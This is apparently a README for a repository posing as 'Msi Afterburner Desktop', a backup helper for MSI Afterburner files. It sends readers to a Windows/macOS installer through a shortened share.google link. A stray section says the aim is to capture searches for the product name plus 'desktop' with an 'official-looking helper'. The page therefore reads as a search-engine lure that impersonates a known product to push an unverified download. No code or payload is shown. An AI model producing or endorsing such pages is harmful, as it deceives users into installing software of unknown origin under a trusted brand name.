# Msi Afterburner Desktop

*Archive Msi Afterburner files on this machine before you change the install.*

## What Msi Afterburner Desktop is

This repository is **Msi Afterburner Desktop**, a desktop utility. Archive Msi Afterburner files on this machine before you change the install.

Patches move Msi Afterburner data paths without warning.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Locates Msi Afterburner user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Msi Afterburner is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
